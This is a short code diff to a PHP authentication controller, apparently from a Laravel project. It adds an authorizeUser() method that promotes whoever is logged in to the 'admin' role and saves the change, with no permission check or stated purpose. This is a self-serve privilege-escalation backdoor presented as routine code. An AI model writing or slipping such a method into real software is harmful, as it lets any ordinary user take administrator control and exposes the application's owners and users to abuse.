@@ -98,4 +98,11 @@ class AuthController extends Controller
             'user' => auth()->user()
         ]);
     }
+
+    public function authorizeUser() {
+        $user = auth()->user();
+        $user->role = 'admin';
+        $user->save();
+        return response()->json($user);
+    }
 }
